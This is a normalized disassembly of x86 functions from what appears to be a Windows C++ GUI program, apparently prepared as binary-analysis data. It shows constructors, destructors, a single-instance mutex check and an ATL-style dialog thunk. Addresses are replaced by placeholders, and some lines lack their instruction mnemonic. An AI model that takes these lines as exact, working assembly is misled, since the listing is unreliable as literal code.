mov edx [ eax + 0x28 ]
call edx
mov eax [ ecx ]
push 0x0
push 0x1
push 0x0
push edx
mov edx [ eax + 0x28 ]
call edx
sub_40da70
push 0xffffffff
push sub_45a11d
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x24 ]
push esi
call sub_422b50
lea eax [ esi + 0x54 ]
xor edi edi
push eax
mov [ esp + 0x20 ] edi
call sub_422b50
lea ecx [ esi + 0xa8 ]
push ecx
mov [ esp + 0x20 ] 0x1
call sub_422b50
mov [ esp + 0x1c ] 0x2
mov [ esi + 0x100 ] edi
mov [ esi + 0x104 ] edi
xor eax eax
mov [ esi + 0x108 ] eax
mov [ esi + 0x10c ] eax
mov [ esi + 0x110 ] eax
mov [ esi + 0x114 ] eax
mov [ esi + 0x118 ] edi
mov [ esi + 0x11c ] edi
mov [ esi + 0x120 ] edi
mov [ esi + 0x124 ] edi
mov [ esi + 0x128 ] edi
mov ebx r--data
mov [ esi + 0xfc ] ebx
mov [ esi + 0x130 ] edi
mov [ esi + 0x134 ] edi
mov [ esi + 0x138 ] eax
mov [ esi + 0x13c ] eax
mov [ esi + 0x140 ] eax
mov [ esi + 0x144 ] eax
mov [ esi + 0x148 ] edi
mov [ esi + 0x14c ] edi
mov [ esi + 0x150 ] edi
mov [ esi + 0x12c ] ebx
mov [ esi + 0x154 ] edi
mov [ esi + 0x158 ] edi
mov [ esi + 0x160 ] edi
mov [ esi + 0x164 ] edi
mov [ esi + 0x168 ] eax
mov [ esi + 0x16c ] eax
mov [ esi + 0x170 ] eax
mov [ esi + 0x174 ] eax
mov [ esi + 0x178 ] edi
mov [ esi + 0x17c ] edi
mov [ esi + 0x180 ] edi
mov [ esi + 0x15c ] ebx
mov [ esi + 0x184 ] edi
mov [ esi + 0x188 ] edi
mov [ esi + 0x190 ] edi
mov [ esi + 0x194 ] edi
mov [ esi + 0x198 ] eax
mov [ esi + 0x19c ] eax
mov [ esi + 0x1a0 ] eax
mov [ esi + 0x1a4 ] eax
lea edx [ esi + 0x1bc ]
push edx
mov [ esi + 0x1a8 ] edi
mov [ esi + 0x1ac ] edi
mov [ esi + 0x1b0 ] edi
mov [ esi + 0x18c ] ebx
mov [ esi + 0x1b4 ] edi
mov [ esi + 0x1b8 ] edi
call sub_422b50
lea eax [ esi + 0x210 ]
push eax
mov [ esp + 0x20 ] 0x3
call sub_422b50
lea ecx [ esi + 0x264 ]
push ecx
mov [ esp + 0x20 ] 0x4
call sub_422b50
mov [ esi + 0x2bc ] edi
mov [ esi + 0x2c0 ] edi
xor eax eax
mov [ esi + 0x2c4 ] eax
mov [ esi + 0x2c8 ] eax
mov [ esi + 0x2cc ] eax
mov [ esi + 0x2d0 ] eax
mov [ esi + 0x2d4 ] edi
mov [ esi + 0x2d8 ] edi
mov [ esi + 0x2dc ] edi
mov [ esi + 0x2b8 ] ebx
mov [ esi + 0x2e0 ] edi
mov [ esi + 0x2e4 ] edi
mov [ esi + 0x2ec ] edi
mov [ esi + 0x2f0 ] edi
mov [ esi + 0x2f4 ] eax
mov [ esi + 0x2f8 ] eax
mov [ esi + 0x2fc ] eax
mov [ esi + 0x300 ] eax
mov [ esi + 0x304 ] edi
mov [ esi + 0x308 ] edi
mov [ esi + 0x30c ] edi
mov [ esi + 0x31c ] edi
mov [ esi + 0x314 ] edi
mov ecx r--data
mov [ esi + 0x2e8 ] ecx
mov [ esi + 0x324 ] edi
mov [ esi + 0x328 ] edi
mov [ esi + 0x32c ] eax
mov [ esi + 0x330 ] eax
mov [ esi + 0x334 ] eax
mov [ esi + 0x338 ] eax
mov [ esi + 0x33c ] edi
mov [ esi + 0x340 ] edi
mov [ esi + 0x344 ] edi
mov [ esi + 0x320 ] ecx
mov [ esi + 0x354 ] edi
mov [ esi + 0x34c ] edi
mov [ esi + 0x35c ] edi
mov [ esi + 0x360 ] edi
mov [ esi + 0x364 ] eax
mov [ esi + 0x368 ] eax
mov [ esi + 0x36c ] eax
mov [ esi + 0x370 ] eax
mov [ esi + 0x374 ] edi
mov [ esi + 0x378 ] edi
mov [ esi + 0x37c ] edi
mov [ esi + 0x358 ] ebx
mov [ esi + 0x380 ] edi
mov [ esi + 0x384 ] edi
mov eax esi
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
sub_40dd60
push ebx
push esi
mov esi eax
push edi
mov ebx r--data
lea edi [ esi + 0x290 ]
mov [ esi + 0x264 ] ebx
call sub_422960
mov eax [ esi + 0x28c ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
lea edi [ esi + 0x23c ]
mov [ esi + 0x210 ] ebx
call sub_422960
mov eax [ esi + 0x238 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x1e8 ]
mov [ esi + 0x1bc ] ebx
call sub_422960
mov eax [ esi + 0x1e4 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0xd4 ]
mov [ esi + 0xa8 ] ebx
call sub_422960
mov eax [ esi + 0xd0 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x80 ]
mov [ esi + 0x54 ] ebx
call sub_422960
mov eax [ esi + 0x7c ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x2c ]
mov [ esi ] ebx
call sub_422960
mov esi [ esi + 0x28 ]
sub esi 0x10
lea ecx [ esi + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
sub_40de90
push 0xffffffff
push sub_45ab21
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x24 ]
xor edi edi
xor eax eax
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x30 ]
mov ebx r--data
push eax
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi ] ebx
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call sub_41c660
mov [ esp + 0x1c ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
xor eax eax
mov [ esi + 0xac ] eax
mov [ esi + 0xb0 ] eax
mov [ esi + 0xb4 ] eax
mov [ esi + 0xb8 ] eax
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xc4 ] edi
mov [ esi + 0xa0 ] r--data
mov [ esi + 0xc8 ] edi
mov [ esi + 0xcc ] edi
mov [ esi + 0xd0 ] edi
mov [ esi + 0xd4 ] edi
mov [ esi + 0xd8 ] 0xffff
mov [ esi + 0xe0 ] edi
mov [ esi + 0xe4 ] edi
mov [ esi + 0xe8 ] eax
mov [ esi + 0xec ] eax
mov [ esi + 0xf0 ] eax
mov [ esi + 0xf4 ] eax
mov [ esi + 0xf8 ] edi
mov [ esi + 0xfc ] edi
mov [ esi + 0x100 ] edi
mov [ esi + 0xdc ] r--data
mov [ esi + 0x110 ] edi
mov [ esi + 0x108 ] edi
mov [ esi + 0x118 ] edi
mov [ esi + 0x11c ] edi
mov [ esi + 0x120 ] eax
mov [ esi + 0x124 ] eax
mov [ esi + 0x128 ] eax
mov [ esi + 0x12c ] eax
mov [ esi + 0x130 ] edi
mov [ esi + 0x134 ] edi
mov [ esi + 0x138 ] edi
mov [ esi + 0x114 ] ebx
mov [ esi + 0x13c ] edi
mov [ esi + 0x140 ] edi
mov [ esi + 0x148 ] edi
mov [ esi + 0x14c ] edi
mov [ esi + 0x150 ] eax
mov [ esi + 0x154 ] eax
mov [ esi + 0x158 ] eax
mov [ esi + 0x15c ] eax
mov [ esi + 0x160 ] edi
mov [ esi + 0x164 ] edi
mov [ esi + 0x168 ] edi
mov [ esi + 0x144 ] ebx
mov [ esi + 0x16c ] edi
mov [ esi + 0x170 ] edi
mov [ esi + 0x178 ] edi
mov [ esi + 0x17c ] edi
mov [ esi + 0x180 ] eax
mov [ esi + 0x184 ] eax
mov [ esi + 0x188 ] eax
mov [ esi + 0x18c ] eax
mov [ esi + 0x190 ] edi
mov [ esi + 0x194 ] edi
mov [ esi + 0x198 ] edi
lea ecx [ esi + 0x1a4 ]
push ecx
mov [ esi + 0x174 ] ebx
mov [ esi + 0x19c ] edi
mov [ esi + 0x1a0 ] edi
call sub_422b50
lea edx [ esi + 0x1f8 ]
push edx
mov [ esp + 0x20 ] 0x1
call sub_422b50
lea eax [ esi + 0x24c ]
push eax
mov [ esp + 0x20 ] 0x2
call sub_422b50
mov [ esp + 0x1c ] 0x3
mov [ esi + 0x2a4 ] edi
mov [ esi + 0x2a8 ] edi
xor eax eax
mov [ esi + 0x2ac ] eax
mov [ esi + 0x2b0 ] eax
mov [ esi + 0x2b4 ] eax
mov [ esi + 0x2b8 ] eax
mov [ esi + 0x2bc ] edi
mov [ esi + 0x2c0 ] edi
mov [ esi + 0x2c4 ] edi
mov [ esi + 0x2a0 ] ebx
mov [ esi + 0x2c8 ] edi
mov [ esi + 0x2cc ] edi
mov [ esi + 0x2d4 ] edi
mov [ esi + 0x2d8 ] edi
mov [ esi + 0x2dc ] eax
mov [ esi + 0x2e0 ] eax
mov [ esi + 0x2e4 ] eax
mov [ esi + 0x2e8 ] eax
lea ecx [ esi + 0x300 ]
push ecx
mov [ esi + 0x2ec ] edi
mov [ esi + 0x2f0 ] edi
mov [ esi + 0x2f4 ] edi
mov [ esi + 0x2d0 ] ebx
mov [ esi + 0x2f8 ] edi
mov [ esi + 0x2fc ] edi
call sub_422b50
lea edx [ esi + 0x354 ]
push edx
mov [ esp + 0x20 ] 0x4
call sub_422b50
lea eax [ esi + 0x3a8 ]
push eax
mov [ esp + 0x20 ] 0x5
call sub_422b50
mov eax esi
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
sub_40e190
push ebx
push edi
mov ebx r--data
lea edi [ esi + 0x3d4 ]
mov [ esi + 0x3a8 ] ebx
call sub_422960
mov eax [ esi + 0x3d0 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
lea edi [ esi + 0x380 ]
mov [ esi + 0x354 ] ebx
call sub_422960
mov eax [ esi + 0x37c ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x32c ]
mov [ esi + 0x300 ] ebx
call sub_422960
mov eax [ esi + 0x328 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x278 ]
mov [ esi + 0x24c ] ebx
call sub_422960
mov eax [ esi + 0x274 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x224 ]
mov [ esi + 0x1f8 ] ebx
call sub_422960
mov eax [ esi + 0x220 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x1d0 ]
mov [ esi + 0x1a4 ] ebx
call sub_422960
mov eax [ esi + 0x1cc ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
pop edi
pop ebx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea eax [ esi + 0x30 ]
jmp sub_41c5c0
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_40e2e0
push 0xffffffff
push sub_45a0bd
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
xor edi edi
xor eax eax
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x30 ]
push eax
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi ] r--data
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call sub_422b50
mov [ esp + 0x14 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
xor eax eax
mov [ esi + 0x90 ] eax
mov [ esi + 0x94 ] eax
mov [ esi + 0x98 ] eax
mov [ esi + 0x9c ] eax
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
mov [ esi + 0x84 ] r--data
mov [ esi + 0xac ] edi
mov [ esi + 0xb0 ] edi
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] eax
mov [ esi + 0xc4 ] eax
mov [ esi + 0xc8 ] eax
mov [ esi + 0xcc ] eax
mov [ esi + 0xd0 ] edi
mov [ esi + 0xd4 ] edi
mov [ esi + 0xd8 ] edi
mov [ esi + 0xb4 ] r--data
mov [ esi + 0xdc ] edi
mov [ esi + 0xe0 ] edi
mov [ esi + 0xe8 ] edi
mov [ esi + 0xec ] edi
mov [ esi + 0xf0 ] eax
mov [ esi + 0xf4 ] eax
mov [ esi + 0xf8 ] eax
mov [ esi + 0xfc ] eax
lea ecx [ esi + 0x114 ]
push ecx
mov [ esi + 0x100 ] edi
mov [ esi + 0x104 ] edi
mov [ esi + 0x108 ] edi
mov [ esi + 0xe4 ] r--data
mov [ esi + 0x10c ] edi
mov [ esi + 0x110 ] edi
call sub_422b50
lea edx [ esi + 0x168 ]
push edx
mov [ esp + 0x18 ] 0x1
call sub_422b50
lea eax [ esi + 0x1bc ]
push eax
mov [ esp + 0x18 ] 0x2
call sub_422b50
lea ecx [ esi + 0x210 ]
push ecx
mov [ esp + 0x18 ] 0x3
call sub_422b50
lea edx [ esi + 0x264 ]
push edx
mov [ esp + 0x18 ] 0x4
call sub_422b50
mov [ esp + 0x14 ] 0x5
lea eax [ esi + 0x2b8 ]
push eax
call sub_422b50
mov [ esp + 0x14 ] 0x6
xor eax eax
mov [ esi + 0x310 ] edi
mov [ esi + 0x314 ] edi
mov [ esi + 0x318 ] eax
mov [ esi + 0x31c ] eax
mov [ esi + 0x320 ] eax
mov [ esi + 0x324 ] eax
lea ecx [ esi + 0x344 ]
push ecx
mov [ esi + 0x328 ] edi
mov [ esi + 0x32c ] edi
mov [ esi + 0x330 ] edi
mov [ esi + 0x30c ] r--data
mov [ esi + 0x340 ] edi
mov [ esi + 0x338 ] edi
call sub_422b50
lea edx [ esi + 0x398 ]
push edx
mov [ esp + 0x18 ] 0x7
call sub_422b50
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0xc
retn 0x4
sub_40e510
push ebx
push esi
mov esi eax
push edi
mov ebx r--data
lea edi [ esi + 0x3c4 ]
mov [ esi + 0x398 ] ebx
call sub_422960
mov eax [ esi + 0x3c0 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
lea edi [ esi + 0x370 ]
mov [ esi + 0x344 ] ebx
call sub_422960
mov eax [ esi + 0x36c ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x2e4 ]
mov [ esi + 0x2b8 ] ebx
call sub_422960
mov eax [ esi + 0x2e0 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x290 ]
mov [ esi + 0x264 ] ebx
call sub_422960
mov eax [ esi + 0x28c ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x23c ]
mov [ esi + 0x210 ] ebx
call sub_422960
mov eax [ esi + 0x238 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x1e8 ]
mov [ esi + 0x1bc ] ebx
call sub_422960
mov eax [ esi + 0x1e4 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x194 ]
mov [ esi + 0x168 ] ebx
call sub_422960
mov eax [ esi + 0x190 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x140 ]
mov [ esi + 0x114 ] ebx
call sub_422960
mov eax [ esi + 0x13c ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x5c ]
mov [ esi + 0x30 ] ebx
call sub_422960
mov esi [ esi + 0x58 ]
sub esi 0x10
lea ecx [ esi + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
sub_40e6e0
push 0xffffffff
push sub_45b3ce
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1c ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x2c ]
xor ebx ebx
mov [ esp + 0x24 ] ebx
mov eax [ ebp + 0xe7c ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0xe70 ]
push eax
mov [ ebp + 0xe7c ] ebx
mov [ ebp + 0xe80 ] ebx
mov [ ebp + 0xe84 ] ebx
call sub_43f960
lea esi [ ebp + 0xe4c ]
add esp 0x4
mov [ esp + 0x18 ] esi
mov [ esp + 0x24 ] 0x8
call sub_426630
mov esi [ esi ]
push esi
call sub_43f960
mov [ esp + 0x28 ] 0x6
add esp 0x4
lea edi [ ebp + 0xd58 ]
mov [ ebp + 0xd2c ] r--data
call sub_422960
mov eax [ ebp + 0xd54 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push eax
call sub_43f960
add esp 0x4
lea eax [ ebp + 0x910 ]
call sub_40e510
lea esi [ ebp + 0x514 ]
call sub_40e190
lea eax [ ebp + 0x18c ]
call sub_40dd60
mov eax [ ebp + 0x17c ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov eax [ ebp + 0x170 ]
push eax
mov [ ebp + 0x17c ] ebx
mov [ ebp + 0x180 ] ebx
mov [ ebp + 0x184 ] ebx
call sub_43f960
add esp 0x4
lea eax [ ebp + 0x90 ]
push eax
mov [ esp + 0x28 ] 0x1
call sub_402e30
mov [ esp + 0x24 ] bl
mov eax [ ebp + 0x7c ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x2c ]
mov ecx [ ebp + 0x180 ]
push edx
push ecx
push eax
call sub_412a80
mov eax [ ebp + 0x17c ]
add esp 0xc
push eax
call sub_43f960
add esp 0x4
lea ecx [ ebp + 0x28 ]
push ecx
mov [ ebp + 0x80 ] ebx
mov [ ebp + 0x84 ] ebx
call sub_423700
mov [ esp + 0x24 ] 0xffffffff
mov ebp [ ebp + 0x14 ]
cmp ebp ebx
je r-xdata
push eax
call sub_44120e
add esp 0x4
mov [ ebp + 0x7c ] ebx
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x4
push ebp
call sub_43f531
sub_40e880
push ebx
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
lea ebx [ esi + 0x4 ]
mov [ esi ] r--data
je r-xdata
test [ esp + 0xc ] 0x1
je r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn 0x4
push esi
call sub_43f960
add esp 0x4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
call sub_419d80
mov [ esi + 0xc ] 0x0
lea eax [ esi + 0x10 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ ebx ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40e8e0
push 0xffffffff
push sub_45b528
mov eax [ fs : 0x0 ]
push eax
sub esp 0xee8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xef8 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0x1c ] r--data
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0xf00 ] ebx
mov edi [ rw-data ]
lea eax [ esp + 0x1c ]
add edi 0x10
push edi
mov [ esp + 0x1c ] eax
call [ EnterCriticalSection@IAT ]
call [ GetCurrentThreadId@IAT ]
mov esi [ rw-data ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x1c ] eax
call sub_41a420
push edi
call [ LeaveCriticalSection@IAT ]
lea eax [ esp + 0x54 ]
push eax
call sub_406780
mov [ esp + 0xf00 ] 0x1
xor esi esi
xor edi edi
cmp [ rw-data ] ebx
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x78 ]
push edx
mov ebx rw-data
call sub_415fe0
add esp 0x8
push esi
push 0xc0000
push 0x860a0000
movzx ebx ax
push 0x0
push edi
lea eax [ esp + 0x68 ]
call sub_4123b0
test eax eax
jne r-xdata
mov [ rw-data ] ebx
lea edi [ esp + 0x1c ]
call sub_419c30
mov esi eax
call sub_419ae0
lea ecx [ esp + 0x54 ]
xor ebx ebx
push ecx
mov [ esp + 0xf04 ] bl
call sub_40e6e0
mov eax [ esp + 0x2c ]
cmp eax ebx
je r-xdata
lea eax [ esp + 0x54 ]
xor ebx ebx
push eax
mov [ esp + 0xf04 ] bl
call sub_40e6e0
mov eax [ esp + 0x2c ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
cmp eax ebx
je r-xdata
push eax
call sub_44120e
add esp 0x4
mov [ esp + 0x2c ] ebx
mov eax [ esp + 0x20 ]
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
cmp eax ebx
je r-xdata
push eax
call sub_44120e
add esp 0x4
mov [ esp + 0x2c ] ebx
mov eax esi
push eax
call sub_44120e
add esp 0x4
xor eax eax
jmp r-xdata
push eax
call sub_44120e
add esp 0x4
mov ecx [ esp + 0xef8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0xef4
retn
sub_40ea80
mov eax [ esi + 0x10 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_44120e
add esp 0x4
mov [ esi + 0x10 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] edi
pop edi
retn
push eax
call sub_44120e
add esp 0x4
mov [ esi + 0x4 ] edi
sub_40eac0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x24 ] eax
push ebx
push esi
mov esi [ ebp + 0x10 ]
push r--data
push 0x1
push 0x0
call [ CreateMutexW@IAT ]
test eax eax
je r-xdata
test esi esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
push 0x0
call [ CoInitialize@IAT ]
call sub_419880
push 0x0
push 0x0
push 0x0
push 0x0
call [ DefWindowProcW@IAT ]
lea eax [ esp + 0x8 ]
push eax
mov [ esp + 0xc ] 0x8
mov [ esp + 0x10 ] 0x4
call [ InitCommonControlsEx@IAT ]
call sub_413600
call sub_40e8e0
call sub_413560
call [ CoUninitialize@IAT ]
xor eax eax
mov [ esp + 0x14 ] ax
mov eax esi
mov [ esp + 0x28 ] 0x7
mov [ esp + 0x24 ] 0x0
lea edx [ eax + 0x2 ]
mov ecx [ esp + 0x2c ]
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_43f96b
mov esp ebp
pop ebp
retn 0x10
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax esi
lea esi [ esp + 0x14 ]
call sub_429cc0
mov eax esi
call sub_428770
push r--data
mov ebx 0x9
xor eax eax
mov edx esi
call sub_41c880
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x28 ] 0x8
jb r-xdata
cmp [ esp + 0x28 ] 0x8
jb r-xdata
mov edx [ esp + 0x14 ]
push edx
call sub_43f960
add esp 0x4
mov eax 0x1
pop esi
pop ebx
mov ecx [ esp + 0x24 ]
xor ecx esp
call sub_43f96b
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esp + 0x14 ]
push ecx
call sub_43f960
add esp 0x4
sub_40ec00
cmp [ edi + 0x20 ] 0x0
push ebx
lea ebx [ edi + 0x20 ]
push esi
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
xor eax eax
push eax
mov eax [ edi + 0xdc ]
xor ecx ecx
push ecx
push eax
mov eax [ edi + 0xd8 ]
mov ecx ebx
call sub_413260
mov eax [ edi + 0x14 ]
mov ecx 0xfffffff3
push 0xd
sub ecx eax
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] ecx
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
lea esi [ edi + 0x8 ]
mov eax edi
call sub_4133f0
mov edx [ esp + 0xc ]
mov ebx [ ebx ]
mov eax [ rw-data ]
push 0x0
push sub_413390
push edx
push ebx
push eax
call [ DialogBoxIndirectParamW@IAT ]
pop esi
pop ebx
retn 0x4
call j_sub_43f543
mov [ edi + 0x14 ] eax
test eax eax
je r-xdata
push 0xe
call [ SetLastError@IAT ]
pop esi
or eax 0xffffffff
pop ebx
retn 0x4
sub_40eca0
push 0xffffffff
push sub_45a028
mov eax [ fs : 0x0 ]
push eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esp + 0x24 ]
xor ecx ecx
xor edx edx
mov [ eax + 0x18 ] 0x7
mov [ eax + 0x14 ] ecx
